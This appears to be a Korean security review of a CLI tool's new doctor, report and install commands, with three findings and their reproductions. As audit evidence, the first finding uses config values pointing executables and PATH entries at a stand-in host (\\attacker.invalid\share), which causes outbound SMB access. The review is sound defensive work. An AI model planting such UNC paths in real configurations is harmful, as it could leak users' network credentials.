# 작업 M 교차 검토: CLI의 새 명령과 조립 (U-3, U-5~U-8, 무결성 확인 조립)

- **페르소나:** 보안·개인정보 검토자(주), 검증 엔지니어(보조). 담당 p5. 읽기 전용 검토이며 저장소 파일은 수정·커밋하지 않았다.
- **대상:** 관리용 main `53eb466`의 `src/cli/**` 중 단계 3 추가분.
  - `install.ts`, `report.ts`, `doctor.ts`, `help.ts`, `progress.ts`, `text-safety.ts`, `guard.ts`, `main.ts`
  - `run.ts`의 U-3와 진행 표시 연결, `assemble.ts`의 무결성 확인 조립, `args.ts`, `security/paths.ts`의 `relateRealPaths`
- **기준:** 작업 지시서 U-1~U-8과 V-1~V-3, `docs/cli-contract.md` 15절, `src/contracts`(`commands.ts`, `integrity.ts`).
- **방법:**
  - `53eb466`을 `git archive`로 `.codaryn\m\base`에 풀고 빌드했다. `node_modules`는 junction으로 연결했다.
  - 실제 CLI 프로세스(`node base\dist\src\cli\main.js ...`)를 최소 환경으로 실행했다. 최소 환경은 PATH, SystemRoot, TEMP 등이며 API 키 변수는 없다.
  - 제공자는 scripted만 썼고, 비밀은 가짜 값(`mfake-...`, 키 모양 아님)만 썼다.
  - 실제 API와 외부 네트워크는 쓰지 않았다. 네트워크 경로 실험은 루프백(`\\127.0.0.1\pipe\...`)과 로컬 명명 파이프(`\\.\pipe\...`)만 썼다. 외부 호스트 이름은 메모리 안 실험에만 썼다(`attacker.invalid`, 실제 접속 없음).
- **결과:** 높음 0건, 중간 1건, 낮음 2건.

## 1. 중간: doctor가 실행 파일 확인 중 UNC·장치 경로에 실제로 접근하면서 "No network access was made"라고 출력함

- **위치:**
  - `src/cli/doctor.ts:119`: 디렉터리가 붙은 실행 파일 이름을 기준 디렉터리에 대해 풀어, 그 경로를 그대로 stat한다.
  - `src/cli/doctor.ts:120`: PATH 항목 중 `isAbsolute`인 것을 모두 쓴다. win32에서 `\\server\share`는 절대 경로다.
  - `src/cli/doctor.ts:342`: 명령 검증기의 `cwd`를 검사 없이 `path.resolve(workspaceRoot, cwd)`로 기준 디렉터리로 쓴다.
  - `src/cli/doctor.ts:139`: 결과와 관계없이 "No network access was made and nothing was changed."를 출력한다.
  - 입력 검증: `src/cli/task.ts:179, 290, 295`. `policy.commands[].executable`, 검증기 `executable`·`cwd`는 문자열인지만 본다. S-5(UNC·장치 경로 거부)는 이 값들에 적용되지 않는다.
- **결정과 어긋나는 점:** U-6은 "네트워크에 접속하지 않고 ... 점검"이다. `doctor.ts:3` 주석도 "No network access"다. 다른 경로 입력(`--config`, `workspaceRoot`, `scriptPath`, `integrity.paths`)은 S-5로 막지만 실행 파일 관련 값은 빠져 있다.
- **깨지는 입력과 결과:**
  1. **메모리 안 실험**(`e1-doctor-paths.mjs`, 실제 접근 없음):
     - 설정 내용:
       - `policy.commands[0].executable = "\\\\attacker.invalid\\share\\tool.exe"`
       - `policy.commands[1].executable = "\\\\.\\pipe\\probe.exe"`
       - 검증기 `{ executable: "bin\\check.exe", cwd: "\\\\attacker.invalid\\share" }`
       - `PATH = "C:\\Windows\\System32;\\\\attacker.invalid\\tools"`
     - `config_file`은 `ok`(설정이 받아들여짐)였다. doctor가 stat하려 한 경로는 아래와 같다.
       - `\\attacker.invalid\share\tool.exe`
       - `\\.\pipe\probe.exe`
       - `\\attacker.invalid\tools\node.EXE`
       - `\\attacker.invalid\share\bin\check.exe`
  2. **실제 CLI, 로컬 명명 파이프**(`e1b-doctor-pipe.mjs`):
     - 실험 스크립트가 `\\.\pipe\codaryn-m-probe.exe`로 파이프 서버를 열었다. 설정의 실행 파일을 그 경로로 두고 `doctor --config ... --workspace ...`를 실행했다.
     - 결과: 파이프 서버가 연결을 2번 받았다. doctor는 `[ok] commands 1 executable(s) found`, 마지막 줄 `No network access was made and nothing was changed.`를 출력했다.
  3. **실제 CLI, 루프백 UNC**(`e1b-doctor-pipe.mjs unc`):
     - 실행 파일을 `\\127.0.0.1\pipe\codaryn-m-probe.exe`로 두었다. 이 경로는 Windows SMB 클라이언트를 거친다.
     - 결과: 같은 파이프가 연결을 2번 받았다. 출력은 위와 같다.
     - 그러니 doctor는 설정에 적힌 UNC 호스트로 실제 SMB 접속을 한다.
- **영향:**
  - 외부 호스트를 가리키는 UNC 실행 파일, 검증기 `cwd`, 또는 PATH 항목이 있으면 doctor가 그 호스트로 SMB 연결을 연다.
  - Windows는 이때 사용자 자격(NTLM)으로 자동 인증을 시도한다. 이 부분은 추측이며, 외부 호스트로는 실험하지 않았다.
  - 사용자는 "네트워크 접속 없음" 출력을 믿고 검토되지 않은 설정을 doctor로 먼저 확인해 볼 수 있다. doctor의 존재 이유가 그 용도다.
  - 회사 환경처럼 PATH에 UNC 항목이 있으면 평범한 설정에서도 출력 문구가 사실과 다르다.
- **관련(코드 읽기, 실험하지 않음):** `run`도 같은 값을 거르지 않는다.
  - 명령 실행기의 PATH 검색(`src/tools/windows-launch.ts:107` `fullyQualified`)은 UNC 항목을 받는다.
  - 검증기 `executable`이 UNC이면 검증 때 그 경로를 찾고 실행한다.
  - 이것은 정책이 허용한 명령의 실행이라 별도 결함으로 세지 않았다. 다만 S-5 목록에 실행 파일 관련 값이 없다는 점은 같다.
- **재현:** `.codaryn\m`에서 `node e1-doctor-paths.mjs`, `node e1b-doctor-pipe.mjs`, `node e1b-doctor-pipe.mjs unc`. 각각 1초 안팎이다.
- **권고(결정은 PM):**
  - doctor의 `commands` 점검에서 UNC·장치 경로를 stat하지 않는다. `checkLocalPathSyntax`가 거부하는 실행 파일, 기준 디렉터리, PATH 항목은 "확인하지 않음"(warn)으로 보고한다.
  - 마지막 줄 문구를 실제 동작에 맞춘다.
  - 실행 파일과 검증기 `cwd`에도 설정·task 읽을 때 S-5를 적용할지 정한다.

## 2. 낮음: 실행 뒤 바뀐 기록에 대해 Markdown report가 `invalid_run_record`가 아니라 `internal_error`(70)로 끝남

- **위치:**
  - `src/cli/report.ts:359`: `out.push("", ...block(...).map(...))`. 근거의 줄 수만큼 인자를 펼친다.
  - `src/cli/report.ts:298`, `report.ts:307`: `Math.max(0, ...[...matchAll(/`+/g)])`. 백틱 묶음 수만큼 인자를 펼친다.
  - `src/cli/report.ts:498`: `renderReport`는 기록 검사용 `try` 밖에서 호출된다.
- **깨지는 입력과 결과:**
  - 정상 scripted 실행 뒤 `result.json`의 실패 검증기 `evidence`를 바꿨다. 두 경우 모두 Markdown 출력은 `internal_error`(종료 70, "codaryn stopped because of an unexpected internal error")였고, `--json`은 정상(종료 0)이었다.
    - 백틱 묶음 200,000개(`` "` ".repeat(200000) ``, 파일 400KB)
    - 짧은 줄 150만여 개(16 MiB), 또는 64 MiB
  - 메모리 안(`e3b-render-inprocess.mjs`):
    - 100,000줄은 그려진다.
    - 150,000줄과 200,000줄은 `RangeError: Maximum call stack size exceeded`(report.ts:359)다.
    - 백틱 묶음 200,000개도 같은 오류다(report.ts:307).
- **영향:**
  - 정상 실행의 근거는 8192바이트 이하라 생기지 않는다. 허용된 명령이나 실행 뒤 남은 자손이 기록을 바꾼 경우에만 생긴다.
  - 그때 report는 무엇이 잘못됐는지 알리지 못하고 내부 오류로 끝난다. 원문 노출이나 프로세스 비정상 종료는 없었다. 최상위 guard가 JSON 한 줄로 바꾼다.
  - 계약 주석은 "every field the report uses is checked"라고 한다. 검사를 통과한 값이 그리기에서 터지는 것이다.
- **재현:** `.codaryn\m`에서 `node e2-report-backticks.mjs 200000`, `node e3-report-size.mjs 16`, `node e3b-render-inprocess.mjs`.
- **권고:**
  - 펼치기 대신 반복으로 최댓값을 구하고 줄을 넣는다.
  - 또는 report에서 근거와 문자열 길이에 상한을 둔다. 예: 기록 근거 상한 `MAX_EVIDENCE_BYTES`를 넘으면 `invalid_run_record`.
  - 큰 파일의 메모리 사용(256 MiB 상한 근처)은 확인하지 못했다(아래 "검사하지 않은 범위").

## 3. 낮음: doctor의 `commands` 점검이 run이 거부할 실행 파일을 "found"(ok)로 보고함

- **위치:** `src/cli/doctor.ts:105-128`(`findExecutable`), `doctor.ts:339-345`.
  - 존재 여부만 본다. run의 실행 규칙(T-4 작업 공간 안 실행 파일 거부, `.cmd`·`.bat`의 작업 공간 안 거부와 인자 문자 집합)을 보지 않는다.
  - 검증기 `cwd`가 작업 공간 밖이어도 확인하지 않는다(run은 `outside_root`로 거부).
- **깨지는 입력과 결과(`e8-doctor-false-ok.mjs`, 실제 CLI):** task에 다음 두 검증기를 두었다.
  - `{ executable: "bin\\check.exe" }`: 작업 공간 안의 빈 파일
  - `{ executable: "tools\\outside.exe", cwd: ".." }`: 작업 공간 밖의 빈 파일
  - doctor: `[ok] commands 2 executable(s) found`, `doctor: ok (exit code 0)`.
  - run: `needs-input`/`verifier_inconclusive`.
    - `inside`: `could not start process (executable_refused)`
    - `outside-cwd`: `working directory rejected (outside_root)`
  - 코드 읽기만 한 것: `.cmd`의 허용 문자 밖 인자(`script_refused`)도 doctor는 보지 않는다. 실험하지 않았다.
- **영향:** 안전 쪽으로 실패한다(run이 거부). 다만 U-6의 목적인 "투입 전 설정 오류를 실제 호출 없이 잡는다"에 비해, doctor가 ok인데 실제 실행에서 검증이 모두 inconclusive가 된다.
- **재현:** `.codaryn\m`에서 `node e8-doctor-false-ok.mjs`.
- **권고:** doctor가 실행기와 같은 판정 함수(작업 공간 안 거부, 스크립트 인자 문자 집합)와 검증기 `cwd` 위치 검사를 쓴다. 최소한 작업 공간 안으로 풀리면 fail로 보고한다.

## 문제 없던 범위 (확인한 것)

- **U-3 설치 위치 거부(`e5-install-dir.mjs`, 실제 CLI):**
  - `base`(이름이 `codaryn`인 package.json이 있는 빌드 사본)를 설치 위치로 두고 시험했다.
  - 다음은 모두 `workspace_is_install_dir`(종료 2)였다: 같은 경로, 안쪽(`src`), 포함하는 상위(`.codaryn\m`), `base`로의 junction, 상위로의 junction을 거쳐 내려가기, 대소문자 변경, `/` 구분자, 끝 구분자, `src\..\.\` 점 조각, `base::$INDEX_ALLOCATION`(NTFS 디렉터리 스트림).
  - 끝 점(`base.`)은 `workspace_not_found`였다.
  - 어느 경우에도 `base\.codaryn`이 생기지 않았다(잠금 전 거부). 대조(별도 디렉터리)는 정상 실행됐다.
  - 판정은 `realpath.native` 양쪽 실경로와 Windows 대소문자 접기로 한다. 같은 판정을 doctor의 `install_dir`도 쓴다.
- **진행 표시(U-8)와 `--quiet`(`e6-progress-report-secret.mjs`):** 등록한 가짜 비밀을 다음 세 곳에 두었다.
  - 작업 공간 파일
  - 모델이 쓴 파일 이름(`{{secret_token:1}}` 복원)
  - 명령 검증기 출력
  - 결과: stderr 진행 11줄, stdout, journal, Markdown·JSON report, doctor 출력 어디에도 원문이 없었다. 파일 이름은 토큰으로, 알 수 없는 도구 이름은 `(unknown tool)`로 나왔다.
  - `--quiet`에서는 stderr가 0줄이었다.
  - 코드 확인: 진행 줄은 journal에 기록된 가림본으로만 만들고, 실행의 가림 모듈로 한 번 더 가린 뒤 제어 문자를 바꾼다(`progress.ts:65-80`). stderr 쓰기는 이 경로 하나뿐이다.
- **report의 실행 디렉터리 조작(`e7-report-tampered.mjs`):** 다음은 모두 `invalid_run_record`(고정 문구)였다. 그 파일 내용은 출력되지 않았다.
  - 실행 디렉터리를 junction으로 바꿈
  - `.codaryn`을 junction으로 바꿈
  - `journal.jsonl`을 가짜 비밀이 든 다른 파일의 하드 링크로 바꿈(`--json`도 같음)
  - 다른 실행의 `result.json`을 넣음
- **doctor의 값 출력:** 메시지는 고정 문구, 필드 위치, 개수만 쓴다.
  - 변수 파일은 `parseEnv`로 읽기만 하고 환경에 넣지 않는다.
  - `CODARYN_CONFIG`(변수 파일에서 온 것 포함), `--config`, `--vars-file`, `--task`, `--workspace`, `scriptPath`, `workspaceRoot`, `integrity.paths`는 S-5 검사를 거친다.
- **도움말·버전:** `--help`는 어디에 있어도 도움말로 끝난다(옵션 값은 `--`로 시작할 수 없음). 버전 문자열은 `^[0-9A-Za-z.+-]{1,64}$`만 출력한다.
- **무결성 확인 조립:** `assemble.ts:151-158`. `protectedPaths`나 `integrity.paths`가 있을 때만 확인기를 만든다. `integrity.paths`는 잠금 전에 존재와 위치(작업 공간과 분리)를 확인한다(`run.ts:294-302`).

## 다시 확인한 알려진 한계 (결함으로 세지 않음)

- **report는 등록 비밀을 모른다.** 실행 중 허용된 명령이나 남은 자손이 journal에 원문을 써 넣으면 report가 그대로 출력한다. `e7` d번에서 재현했다(`file_changed.path`에 넣은 가짜 비밀이 Markdown에 나옴). `REPORT_FIXED_LIMITS` 4번 문장이 이 한계를 적고 있고, 현재 키 모양 값만 `hideKeys`가 가린다.
- **`report --json`은 JSON 문자열 이스케이프만 한다.** C1 제어 문자와 양방향 제어 문자(U+202E 등)는 그대로 나간다. 이것은 코드 읽기만 했다. Markdown 출력은 `cleanText`가 바꾼다.

## 검사하지 않은 범위

- 8.3 이름: 이 볼륨에는 짧은 이름이 없어(`dir /x` 빈칸) 시험하지 못했다. `subst` 드라이브와 볼륨 마운트 지점은 시스템 상태를 바꾸므로 하지 않았다.
- 외부 호스트로의 실제 SMB 접속과 NTLM 전송(외부 네트워크 금지). 1번의 자격 전송은 Windows 동작에 근거한 추측이다.
- 256 MiB 상한 근처 파일의 메모리 사용과 시간. 70 MiB까지만 해 봤다(`--json` 0.55초).
- POSIX에서의 동작, `npm link`로 설치한 전역 명령의 설치 위치 판정.
- `report`·`doctor`의 텍스트 출력을 실제 터미널 에뮬레이터에 넣어 보는 시험(제어 문자 처리는 코드 읽기).
- K5 통합 테스트 자체, `docs/self-development.md`.

## 실험 파일 (`.codaryn\m`, 저장소 밖)

- `base\`: 53eb466 빌드 사본. `node_modules`는 junction이다.
- `harness.mjs`: 사례 생성과 CLI 실행(최소 환경)을 맡는다.
- 재현 스크립트:
  - `e1-doctor-paths.mjs`, `e1b-doctor-pipe.mjs`: 1번
  - `e2-report-backticks.mjs`, `e3-report-size.mjs`, `e3b-render-inprocess.mjs`: 2번
  - `e8-doctor-false-ok.mjs`: 3번
  - `e5-install-dir.mjs`, `e6-progress-report-secret.mjs`, `e7-report-tampered.mjs`: 문제 없던 범위
- `cases\`: 실행 결과(작업 공간, journal)다.
